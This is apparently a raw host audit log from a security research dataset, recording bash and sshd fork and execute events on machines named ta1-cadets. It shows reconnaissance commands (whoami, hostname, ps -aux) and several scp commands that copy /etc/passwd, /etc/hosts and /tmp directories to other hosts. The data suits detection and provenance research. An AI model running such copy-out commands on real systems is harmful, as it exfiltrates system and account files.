1558103323.591:504715588,12C5095A-78B0-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 admin@128.55.12.110:./files/,ta1-cadets-2
1558103323.591:504714427,0D857332-78B0-11E9-B41B-D4AE52C1DBD3:bash,FORK,12C5095A-78B0-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558103314.791:504692708,0D7DC547-78B0-11E9-B41B-D4AE52C1DBD3:sshd,FORK,0D857332-78B0-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558103314.921:504691191,0D98FFF5-78B0-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 admin@128.55.12.110:./backup/,ta1-cadets-2
1558103314.921:504691190,0D857332-78B0-11E9-B41B-D4AE52C1DBD3:bash,FORK,0D98FFF5-78B0-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558103284.711:504623040,FB986E26-78AF-11E9-B129-6C2B597E484C:bash,EXECUTE,EB3C59D2-D408-C758-88D4-48C2F8C7517B,hostname,ta1-cadets-3
1558103216.149:504364659,D2BA9715-78AF-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558103216.149:504364029,D2829F92-78AF-11E9-A28B-D4AE52C1DBD3:bash,FORK,D2BA9715-78AF-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102952.611:503584856,35A538BD-78AF-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-2
1558102950.461:503580147,345D3AE3-78AF-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-2
1558102950.461:503580146,3457E180-78AF-11E9-B41B-D4AE52C1DBD3:bash,FORK,345D3AE3-78AF-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102904.470:503507748,18F3AAC7-78AF-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/hosts admin@128.55.12.51:./docs/,ta1-cadets-3
1558102904.470:503507747,18E13834-78AF-11E9-B129-6C2B597E484C:bash,FORK,18F3AAC7-78AF-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102910.399:503467741,1C7BAB6D-78AF-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558102910.389:503467740,1C7B9266-78AF-11E9-A28B-D4AE52C1DBD3:bash,FORK,1C7BAB6D-78AF-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102910.389:503467738,1C671609-78AF-11E9-A28B-D4AE52C1DBD3:bash,FORK,1C7B9266-78AF-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102905.829:503450505,19C16CD0-78AF-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -d -t ./backup/,ta1-cadets-1
1558102904.879:503447259,19307AC2-78AF-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -t ./docs/,ta1-cadets-1
1558102853.369:503262376,FA7EEFFC-78AE-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.118:./docs/,ta1-cadets-1
1558102853.369:503262375,FA6B457D-78AE-11E9-A28B-D4AE52C1DBD3:bash,FORK,FA7EEFFC-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102853.239:503262239,FA63A2DC-78AE-11E9-A28B-D4AE52C1DBD3:sshd,FORK,FA6B457D-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102826.030:503238924,EA3256D2-78AE-11E9-B129-6C2B597E484C:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-3
1558102800.861:503229242,DB31CD76-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102795.621:503227463,D812C028-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,EB3C59D2-D408-C758-88D4-48C2F8C7517B,hostname,ta1-cadets-2
1558102795.621:503227462,D801FC66-78AE-11E9-B41B-D4AE52C1DBD3:bash,FORK,D812C028-78AE-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102795.511:503227380,D7FA253B-78AE-11E9-B41B-D4AE52C1DBD3:sshd,FORK,D801FC66-78AE-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102712.860:503140874,A6BE6A4C-78AE-11E9-B129-6C2B597E484C:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-3
1558102712.221:503140310,A65BD582-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -t ./files/,ta1-cadets-2
1558102705.010:503129297,A21131C8-78AE-11E9-B129-6C2B597E484C:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps,ta1-cadets-3
1558102695.700:503113078,9C848334-78AE-11E9-B129-6C2B597E484C:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-3
1558102671.119:503092495,8DDC703A-78AE-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 /tmp/tmux-1001 admin@128.55.12.75:./test/,ta1-cadets-1
1558102671.109:503092494,8D3CA8D5-78AE-11E9-A28B-D4AE52C1DBD3:bash,FORK,8DDC703A-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102671.631:503089994,8E29782C-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -d -t ./test/,ta1-cadets-2
1558102670.199:503089485,8D512B0F-78AE-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,/usr/bin/scp,ta1-cadets-1
1558102670.199:503089477,8D3CA8D5-78AE-11E9-A28B-D4AE52C1DBD3:bash,FORK,8D512B0F-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102670.941:503088651,8DC18D34-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -d -t ./docs/,ta1-cadets-2
1558102669.061:503086985,8CA322F3-78AE-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 admin@128.55.12.78:./files/,ta1-cadets-2
1558102663.619:503083803,89651257-78AE-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558102663.619:503083800,8964FA1C-78AE-11E9-A28B-D4AE52C1DBD3:bash,FORK,89651257-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102663.619:503083798,895137D6-78AE-11E9-A28B-D4AE52C1DBD3:bash,FORK,8964FA1C-78AE-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558102454.830:503008203,0CF2C558-78AE-11E9-B129-6C2B597E484C:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.111:./test/,ta1-cadets-3
1558102454.830:503007498,0CE0B59B-78AE-11E9-B129-6C2B597E484C:bash,FORK,0CF2C558-78AE-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102454.720:503007423,0CD9CB05-78AE-11E9-B129-6C2B597E484C:sshd,FORK,0CE0B59B-78AE-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102365.681:502980476,D7CF5F72-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102365.681:502980475,D7CF4593-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,D7CF5F72-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102365.681:502980473,D7A768DB-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,D7CF4593-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102365.140:502980072,D77C3C9E-78AD-11E9-B129-6C2B597E484C:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-3
1558102362.900:502978938,D626482A-78AD-11E9-B129-6C2B597E484C:bash,EXECUTE,EB3C59D2-D408-C758-88D4-48C2F8C7517B,hostname,ta1-cadets-3
1558102332.241:502962145,C3DFC88E-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102332.231:502962144,C3DFB07B-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,C3DFC88E-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102332.231:502962142,C3B0D251-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,C3DFB07B-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102279.671:502768598,A48A3BF7-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102279.661:502768597,A48A2448-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,A48A3BF7-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102279.661:502768595,A475E27D-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,A48A2448-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102217.039:502767699,7F348B98-78AD-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -t ./backup/,ta1-cadets-1
1558102107.381:502475243,3DD93076-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102107.381:502475242,3DD917D1-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,3DD93076-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102107.381:502475240,3DC4F67B-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,3DD917D1-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102092.461:502461948,34F4F9E8-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-2
1558102088.361:502461114,3282B2B0-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-2
1558102079.041:502458441,2CF5AA70-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558102077.931:502457232,2C4BC136-78AD-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps,ta1-cadets-2
1558102077.931:502457231,2C45102B-78AD-11E9-B41B-D4AE52C1DBD3:bash,FORK,2C4BC136-78AD-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558102030.570:502437920,101156DB-78AD-11E9-B129-6C2B597E484C:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-3
1558102030.570:502437917,1011477A-78AD-11E9-B129-6C2B597E484C:bash,FORK,101156DB-78AD-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102030.570:502437915,0FFF0367-78AD-11E9-B129-6C2B597E484C:bash,FORK,1011477A-78AD-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102030.451:502437775,0FF7E9CF-78AD-11E9-B129-6C2B597E484C:sshd,FORK,0FFF0367-78AD-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558102030.400:502437768,0FD0FD67-78AD-11E9-B129-6C2B597E484C:sshd,FORK,0FF7E9CF-78AD-11E9-B129-6C2B597E484C,sshd,ta1-cadets-3
1558101959.169:502198852,E58186E2-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558101959.159:502198851,E5816EF1-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,E58186E2-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101959.159:502198849,E56DB7BC-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,E5816EF1-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101891.529:502001704,BD310DE9-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-1
1558101888.429:501994960,BB575ED5-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,EB3C59D2-D408-C758-88D4-48C2F8C7517B,hostname,ta1-cadets-1
1558101888.419:501994959,BAA39B95-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,BB575ED5-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101869.429:501965285,B002FCDA-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r -t ./docs/,ta1-cadets-1
1558101868.899:501958952,AFB461A1-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.51:./docs/,ta1-cadets-1
1558101868.899:501958951,AFA09762-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,AFB461A1-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101868.768:501958546,AF989A15-78AC-11E9-A28B-D4AE52C1DBD3:sshd,FORK,AFA09762-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101868.719:501958488,AF57238D-78AC-11E9-A28B-D4AE52C1DBD3:sshd,FORK,AF989A15-78AC-11E9-A28B-D4AE52C1DBD3,sshd,ta1-cadets-1
1558101868.289:501958420,C846820E-70CA-11E9-A28B-D4AE52C1DBD3:sshd,FORK,AF57238D-78AC-11E9-A28B-D4AE52C1DBD3,sshd,ta1-cadets-1
1558101791.071:501829436,81512560-78AC-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-2
1558101791.071:501829435,7F723EB5-78AC-11E9-B41B-D4AE52C1DBD3:bash,FORK,81512560-78AC-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558101787.931:501827536,7F618574-78AC-11E9-B41B-D4AE52C1DBD3:sshd,FORK,7F723EB5-78AC-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558101624.639:501588840,1E1D2818-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558101624.639:501588839,1E1D0898-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,1E1D2818-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101624.639:501588837,1E07BD94-78AC-11E9-A28B-D4AE52C1DBD3:bash,FORK,1E1D0898-78AC-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101606.628:501546553,13614C7A-78AC-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 /tmp/tmux-1001 admin@128.55.12.124:\C:WindowsTemp,ta1-cadets-1
1558101584.981:501498495,06793CCE-78AC-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-2
1558101584.981:501498492,067924DF-78AC-11E9-B41B-D4AE52C1DBD3:bash,FORK,06793CCE-78AC-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558101584.981:501498490,0664D1DF-78AC-11E9-B41B-D4AE52C1DBD3:bash,FORK,067924DF-78AC-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558101517.620:501449424,DE53F752-78AB-11E9-B129-6C2B597E484C:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-3
1558101517.620:501449415,DCF477D2-78AB-11E9-B129-6C2B597E484C:bash,FORK,DE53F752-78AB-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558101515.320:501448932,DCED0D8F-78AB-11E9-B129-6C2B597E484C:sshd,FORK,DCF477D2-78AB-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558101515.360:501448620,DCFB0936-78AB-11E9-B129-6C2B597E484C:bash,EXECUTE,588E0C7A-F996-4D59-96F9-E63F194DA5E2,ps -aux,ta1-cadets-3
1558101515.360:501448619,DCF477D2-78AB-11E9-B129-6C2B597E484C:bash,FORK,DCFB0936-78AB-11E9-B129-6C2B597E484C,bash,ta1-cadets-3
1558101501.791:501443800,D4E37EFF-78AB-11E9-B41B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /tmp/grains /tmp/hsperfdata_darpa /tmp/jna-95354950 /tmp/minion /tmp/nodeexporter /tmp/resource-2679455198775069532 /tmp/resource-3259361836296904187 /tmp/tmux-0 admin@128.55.12.124:.,ta1-cadets-2
1558101501.791:501441053,D4CFE787-78AB-11E9-B41B-D4AE52C1DBD3:bash,FORK,D4E37EFF-78AB-11E9-B41B-D4AE52C1DBD3,bash,ta1-cadets-2
1558101461.219:501341364,BCB5982A-78AB-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558101461.219:501341363,BCB58031-78AB-11E9-A28B-D4AE52C1DBD3:bash,FORK,BCB5982A-78AB-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101461.219:501341361,BCA18211-78AB-11E9-A28B-D4AE52C1DBD3:bash,FORK,BCB58031-78AB-11E9-A28B-D4AE52C1DBD3,bash,ta1-cadets-1
1558101453.949:501317324,B85FDE80-78AB-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/hosts admin@128.55.12.79:./work/,ta1-cadets-1
